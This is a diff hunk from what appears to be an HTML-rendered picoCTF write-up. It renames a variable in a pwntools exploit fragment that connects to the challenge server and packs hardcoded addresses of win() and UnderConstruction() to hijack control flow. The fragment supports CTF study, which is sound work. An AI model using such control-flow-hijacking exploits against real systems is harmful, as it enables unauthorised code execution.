@@ -967,7 +967,7 @@ As <em>check</em> contains the address of <em>hard_checker</em>, we decrease its
 
 <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;saturn.picoctf.net&#39;</span><span class="p">,</span> <span class="mi">56141</span><span class="p">)</span>
 
-<span class="n">rip</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049da0</span><span class="p">)</span> <span class="c1"># win()</span>
+<span class="n">eip</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049da0</span><span class="p">)</span> <span class="c1"># win()</span>
 <span class="n">esp</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049e20</span><span class="p">)</span> <span class="c1"># UnderConstruction()</span>
 
 <span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Give me a string that gets you the flag&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
